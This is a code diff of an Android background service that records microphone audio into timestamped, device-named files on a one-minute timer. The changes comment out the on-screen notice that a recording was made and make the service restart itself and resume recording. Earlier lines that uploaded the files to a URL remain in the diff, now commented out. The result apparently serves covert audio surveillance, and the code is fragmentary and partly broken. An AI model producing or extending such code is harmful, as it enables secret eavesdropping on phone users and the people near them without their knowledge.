@@ -44,7 +44,7 @@ public class MyService extends Service {
         String currentDateandTime = sdf.format(new Date());
         s= "/"+Constants.deviceName+"_recordings_"+currentDateandTime+".3gp";
 
-        Toast.makeText(MyService.this,"recorded: "+s, Toast.LENGTH_LONG).show();
+       // Toast.makeText(MyService.this,"recorded: "+s, Toast.LENGTH_LONG).show();
         mediaRecorder= new MediaRecorder();
         filePath = Environment.getExternalStorageDirectory().getAbsolutePath() + s;
         mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -107,7 +107,7 @@ public class MyService extends Service {
                     @SuppressWarnings("unchecked")
                     public void run() {
                         try {
-                           // dest();
+                           //dest();
                             new AudioRecordClass().startRecord();
                         }
                         catch (Exception e) {
@@ -117,7 +117,7 @@ public class MyService extends Service {
                 });
             }
         };
-        timer.schedule(doAsynchronousTask,0,  60001);
+        timer.schedule(doAsynchronousTask,0,  60000);
        // new AudioRecordClass().startRecord();
 
       //  new AudioRecordClass().startRecord();
@@ -150,16 +150,19 @@ public class MyService extends Service {
 
     public void dest()
     {
-       // super.onDestroy();
+        super.onDestroy();
 
-        mediaRecorder.stop();
-        mediaRecorder.reset();
+        Toast.makeText(MyService.this,"dest e aschi", Toast.LENGTH_LONG).show();
 
-        Constants.fileName=s;
-       new sendFile().execute(url);
+        new AudioRecordClass().startRecord();
+//        mediaRecorder.stop();
+//        mediaRecorder.reset();
+//
+//        Constants.fileName=s;
+//       new sendFile().execute(url);
 
-        recording();
-        //startService(new Intent(getBaseContext(), MyService.class));
+   //     recording();
+        startService(new Intent(getBaseContext(), MyService.class));
     }
 
 }
